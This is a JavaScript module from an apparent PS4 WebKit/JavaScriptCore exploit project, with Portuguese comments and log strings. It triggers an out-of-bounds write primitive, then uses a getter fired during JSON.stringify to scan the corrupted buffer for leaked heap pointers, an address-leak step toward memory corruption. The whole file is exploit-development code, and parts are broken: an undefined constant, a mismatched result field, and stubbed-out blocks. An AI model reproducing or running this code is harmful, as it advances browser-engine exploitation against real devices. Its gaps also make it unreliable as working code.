// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForFinalAddrOfSnoop";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    potential_pointers_found: [], details: ""
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Tamanho da área a ser sondada no oob_array_buffer_real
const SNOOP_AREA_SIZE_BYTES = 0x800; // Sondar primeiros 2KB

class CheckpointForFinalSnoop {
    constructor(id) {
        this.id_marker = `FinalSnoopCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "FinalAddrOfSnoop_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, sondando oob_ab por ponteiros.",
            error: null, potential_pointers_found: [], details: ""
        };
        let details_log = [];
        let found_leaks_count = 0;

        try {
            if (!oob_array_buffer_real || !oob_read_absolute || !JSC_OFFSETS.JSCell || 
                !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBufferContents ||
                JSC_OFFSETS.ArrayBuffer.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID === undefined) {
                throw new Error("Dependências OOB, oob_ab ou Offsets JSC cruciais não disponíveis no getter.");
            }
            const AB_STRUCTURE_ID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;

            // 1. Criar alguns objetos alvo no getter. Seus endereços (ou ponteiros para suas estruturas)
            //    são o que gostaríamos de encontrar no oob_array_buffer_real.
            let target_ab_victim = new ArrayBuffer(128);
            let target_obj_victim = { name: "VictimObject", value: Date.now() };
            let target_arr_victim = [target_obj_victim, 1, "test"];
            details_log.push(`Objetos vítima criados: target_ab_victim (128B), target_obj_victim, target_arr_victim (len 3).`);
            // Não podemos logar seus endereços diretamente, esse é o objetivo!

            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por ponteiros ou dados de vítima...", "info", FNAME_GETTER);
            const snoop_limit = Math.min(SNOOP_AREA_SIZE_BYTES, oob_array_buffer_real.byteLength);
            
            for (let offset = 0; (offset + 8) <= snoop_limit; offset += 4) { // Ler de 4 em 4 bytes, mas verificar como QWORDs
                try {
                    // Ler 8 bytes para verificar se é um ponteiro
                    const val64 = oob_read_absolute(offset, 8);
                    
                    if (!val64.equals(AdvancedInt64.Zero) && !val64.equals(CORRUPTION_VALUE_TRIGGER)) {
                        const val_str = val64.toString(true);
                        
                        // Heurística para ponteiro de heap do JSC (ajuste os limites conforme necessário)
                        // Ponteiros geralmente são > 0x100000000 (para heap alto) e não são valores "pequenos" ou FFF...
                        // Também, ponteiros são frequentemente alinhados em 8 bytes.
                        if ( (offset % 8 === 0) && 
                             (val64.high() > 0x0001 && val64.high() < 0x8000) && // Parte alta > 64KB e < 2GB (estimativa grosseira para PS4 userland heap)
                             (val64.low() !== 0 || val64.high() !== 0) && // Não é nulo
                             !(val64.low() === 0xFFFFFFFF && val64.high() === 0xFFFFFFFF) ) { // Não é o valor da corrupção
                            
                            const leak_info = `PONTEIRO SUSPEITO? oob_data[${toHex(offset)}] = ${val_str}`;
                            logS3(leak_info, "leak", FNAME_GETTER);
                            current_test_results.potential_pointers_found.push({offset: toHex(offset), value: val_str});
                            found_leaks_count++;
                        }
                        // Logar seletivamente outros valores não-zero significativos para não poluir demais
                        else if (offset % 64 === 0 && val64.low() !== OOB_AB_FILL_PATTERN_U32 && val64.high() !== OOB_AB_FILL_PATTERN_U32 ) { 
                           // logS3(`Snoop: oob_data[${toHex(offset)}] = ${val_str}`, "info", FNAME_GETTER);
                        }
                    }
                } catch (e_snoop) {
                    // details_log.push(`Erro ao sondar oob_data[${toHex(offset)}]: ${e_snoop.message}`);
                }
            }

            if (found_leaks_count > 0) {
                current_test_results.success = true;
                current_test_results.message = `Encontrado(s) ${found_leaks_count} potencial(is) ponteiro(s) vazado(s) no oob_array_buffer_real!`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
            } else {
                current_test_results.message = "Nenhum ponteiro óbvio vazado para o oob_array_buffer_real durante a sondagem.";
                 logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "warn", FNAME_GETTER);
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_final_snoop_attempt": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForFinalSnoop.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_final_snoop_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeFinalAddrOfSnoopTestRunner";
    logS3(`--- Iniciando Tentativa Final de AddrOf por Sondagem no Getter ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // NÃO preencher oob_array_buffer_real com padrão aqui, queremos ver o conteúdo "natural" do heap + nossa escrita.
        
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForFinalSnoop(1);
        logS3(`CheckpointForFinalSnoop objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO FINAL SONDAGEM ADDR_OF: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO FINAL SONDAGEM ADDR_OF: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.potential_pointers_found && current_test_results.potential_pointers_found.length > 0) {
            logS3("--- Potenciais Ponteiros Encontrados no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.potential_pointers_found.forEach(leak => {
                logS3(`  Offset ${leak.offset}: ${leak.hex_value}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    logS3(`--- Tentativa Final de AddrOf por Sondagem Concluída ---`, "test", FNAME_TEST_RUNNER);
}
